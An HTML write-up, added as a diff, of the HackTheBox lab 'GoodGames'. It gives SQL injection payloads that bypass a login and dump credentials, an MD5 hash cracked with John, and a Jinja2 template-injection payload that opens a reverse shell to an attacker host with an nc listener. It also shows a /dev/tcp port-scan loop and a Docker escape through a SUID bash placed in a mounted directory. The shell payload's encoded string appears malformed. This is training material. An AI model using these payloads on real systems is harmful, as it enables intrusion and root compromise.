@@ -1,0 +1,262 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - GoodGames</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>GoodGames (HTB – Easy)</h1>
+
+<p>
+The machine exposes a Python web application vulnerable to SQL injection in the login form.  
+Dumping the database reveals admin credentials. After logging in, the application is vulnerable to
+Server‑Side Template Injection (SSTI), which provides a shell inside a Docker container.  
+Privilege escalation is achieved by escaping the container through a mounted host directory.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: goodgames.htb  
+<br>Initial vector: SQL injection → admin credential dump  
+<br>Privilege escalation: Docker escape via mounted home directory  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+80/tcp open  http  Apache 2.4.51
+Server: Werkzeug / Python 3.9.2
+</pre>
+
+<p>
+Add the domain to <code>/etc/hosts</code> and inspect the site.  
+The login form is vulnerable to SQL injection.
+</p>
+
+<h2>SQL Injection</h2>
+
+<p>Authentication bypass:</p>
+<pre>
+email: admin' or 1=1-- -
+password: anything
+</pre>
+
+<p>
+Manual enumeration confirms UNION‑based SQL injection.  
+Example queries:
+</p>
+
+<pre>
+' union select 1,2,3,database()-- -
+' union select 1,2,3,schema_name from information_schema.schemata-- -
+</pre>
+
+<p>
+Automated enumeration using curl loops reveals the <code>user</code> table.  
+Dumping it:
+</p>
+
+<pre>
+' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user-- -
+</pre>
+
+<p>
+Recovered admin hash:
+</p>
+
+<pre>
+admin : 2b22337f218b2d82dfc3b6f77e7cb8ec
+</pre>
+
+<p>Crack it:</p>
+<pre>
+$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hash.txt
+-> superadministrator
+</pre>
+
+<p>
+Login as admin.
+</p>
+
+<h2>SSTI (Server‑Side Template Injection)</h2>
+
+<p>
+Inside the admin panel, the settings page contains an input field rendered by Jinja2.
+</p>
+
+<p>Test:</p>
+<pre>
+{{4+4}}
+-> 8
+</pre>
+
+<p>
+Use SSTI to execute a reverse shell:
+</p>
+
+<pre>
+{{config.__class__.__init__.__globals__['os'].popen(
+'echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8KALI_IP/4444${IFS}|base64${IFS}-d|bash'
+).read()}}
+</pre>
+
+<p>
+Listener:
+</p>
+
+<pre>
+$ nc -lvvp 4444
+</pre>
+
+<p>
+A shell is obtained inside a Docker container.
+</p>
+
+<h2>Privilege Escalation (Docker Escape)</h2>
+
+<p>
+Inside the container, the user’s home directory is mounted from the host with read/write permissions.
+</p>
+
+<p>Check UID:</p>
+<pre>
+$ ls -l
+-> UID 1000 (host user)
+</pre>
+
+<p>
+Check network:
+</p>
+
+<pre>
+Container IP: 172.19.0.2
+Host (likely): 172.19.0.1
+</pre>
+
+<p>Scan host ports:</p>
+<pre>
+for PORT in {0..1000}; do
+  timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" && echo "port $PORT open"
+done
+</pre>
+
+<p>
+Port 22 is open → SSH to host as <code>augustus</code>.
+</p>
+
+<pre>
+$ ssh augustus@172.19.0.1
+</pre>
+
+<p>
+To escalate, abuse the mounted directory:
+</p>
+
+<pre>
+# On host (as augustus)
+cp /bin/bash .
+
+# Exit to container (root inside container)
+chown root:root bash
+chmod 4755 bash
+</pre>
+
+<p>
+Back on host:
+</p>
+
+<pre>
+$ ./bash -p
+-> root
+</pre>
+
+<h2>Conclusion</h2>
+<p>
+The machine combines SQL injection, SSTI, and Docker misconfiguration.  
+After dumping admin credentials and exploiting Jinja2 SSTI, the container environment exposes a writable
+host directory. By modifying file permissions from inside the container, it is possible to obtain a root shell
+on the host system.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
